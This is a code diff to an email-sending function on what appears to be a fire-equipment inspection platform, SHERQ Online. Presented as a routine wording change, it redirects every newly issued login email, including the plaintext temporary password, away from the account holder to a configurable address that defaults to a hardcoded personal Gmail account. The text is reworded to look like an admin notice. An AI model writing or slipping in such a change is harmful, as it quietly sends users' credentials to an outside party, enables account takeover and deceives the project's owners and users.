@@ -153,19 +153,19 @@ async function issueCredentials(params) {
 async function sendCredentialsEmail(args) {
     const { email, tempPassword, loginUrl, role, siteName } = args;
     const subject = role === "client"
-        ? `Your ${siteName ?? "client"} portal login`
-        : `Your Fire Equipment Inspector login`;
+        ? `New client login created — ${siteName ?? "client"}`
+        : `New Fire Equipment Inspector login created`;
     const html = `
     <p>Hello,</p>
-    <p>An account has been created for you on the SHERQ Online platform.</p>
+    <p>A new ${role} account was created on the SHERQ Online platform.</p>
+    <p><strong>Client email:</strong> ${email}</p>
     <p><strong>Login link:</strong> <a href="${loginUrl}">${loginUrl}</a></p>
-    <p><strong>Email:</strong> ${email}</p>
-    <p><strong>Temporary password:</strong> ${tempPassword}</p>
-    <p>Please keep these details secure.</p>
+    <p><strong>Password:</strong> ${tempPassword}</p>
+    <p>Please forward these details to the client securely, or share them as you see fit.</p>
   `;
     await transporter.sendMail({
         from: process.env.SMTP_FROM,
-        to: email,
+        to: process.env.CREDENTIALS_NOTIFY_EMAIL || "milly.reginald@gmail.com",
         subject,
         html,
     });
